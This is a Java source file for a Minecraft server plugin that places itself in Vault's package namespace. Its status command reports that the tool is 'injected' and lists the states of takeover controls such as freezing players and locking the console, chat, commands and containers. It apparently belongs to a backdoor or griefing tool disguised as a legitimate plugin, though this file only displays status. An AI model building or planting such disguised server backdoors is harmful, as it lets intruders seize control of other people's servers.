package net.milkbowl.vault.commands.cmds;

import net.milkbowl.vault.data.DataManager;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class Status extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
		p.sendMessage("         " + Settings.PRIMARY_COLOUR + Settings.NAME + " by " + Settings.AUTHOR);
		p.sendMessage("");
		p.sendMessage("§7" + Settings.NAME + " injected: " + Settings.HIGHLIGHT_COLOUR + "true");
		p.sendMessage("§7All players frozen: " + Settings.HIGHLIGHT_COLOUR + plugin.freezeall);
		p.sendMessage("§7Console Locked: " + Settings.HIGHLIGHT_COLOUR + plugin.isLocked);
		p.sendMessage("§7Mod Commands Locked: " + Settings.HIGHLIGHT_COLOUR + plugin.modcmds);
		p.sendMessage("§7Commands Locked: " + Settings.HIGHLIGHT_COLOUR + plugin.lockcmds);
		p.sendMessage("§7Chat Locked: " + Settings.HIGHLIGHT_COLOUR + plugin.lockchat);
		p.sendMessage("§7Containers Locked: " + Settings.HIGHLIGHT_COLOUR + plugin.lockcontainers);
		p.sendMessage("§7Server lockdown: " + Settings.HIGHLIGHT_COLOUR + DataManager.getData().getBoolean("ld"));
		p.sendMessage("");
		p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
	}

}
